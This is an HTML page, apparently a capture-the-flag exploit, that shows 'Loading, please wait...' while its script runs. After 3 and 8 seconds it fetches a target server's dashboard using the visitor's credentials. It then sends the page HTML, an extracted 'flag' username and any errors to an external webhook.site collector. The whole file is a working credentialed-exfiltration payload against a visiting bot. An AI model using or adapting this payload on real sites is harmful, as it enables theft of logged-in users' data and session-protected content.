<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Processing...</title>
</head>
<body>
    <h1>Loading, please wait...</h1>
    
    <script>
    // 봇은 5초 후 페이지를 떠나므로, 3초 후에 실행 (여유 시간 확보)
    setTimeout(async function() {
        try {
            // 타겟 서버의 dashboard fetch 시도
            const response = await fetch('http://65.109.202.184/dashboard', {
                method: 'GET',
                credentials: 'include'
            });
            
            const html = await response.text();
            
            // FLAG 추출 및 전송
            await fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    html: html,
                    timestamp: new Date().toISOString()
                })
            });
            
            // username 추출
            const match = html.match(/Welcome,\s*([^!]+)!/);
            if (match) {
                await fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
                    method: 'POST',
                    headers: {'Content-Type': 'text/plain'},
                    body: 'FLAG_EXTRACTED: ' + match[1]
                });
            }
        } catch (error) {
            // 에러도 전송하여 디버깅
            await fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
                method: 'POST',
                headers: {'Content-Type': 'text/plain'},
                body: 'ERROR_3SEC: ' + error.toString()
            });
        }
    }, 3000);  // 3초로 단축!
    
    // 추가 시도: 더 늦은 시간 (봇이 로그인한 후)에도 시도
    // 이 코드는 페이지가 unload되면 실행 안 될 수 있음
    setTimeout(async function() {
        try {
            const response = await fetch('http://65.109.202.184/dashboard', {
                credentials: 'include'
            });
            const html = await response.text();
            await fetch('https://webhook.site/7bcce5af-1a4e-4c2f-86f4-6e71aacd7316', {
                method: 'POST',
                body: 'LATE_ATTEMPT: ' + html
            });
        } catch(e) {}
    }, 8000);  // 8초 (봇 로그인 후)
    </script>
</body>
</html>
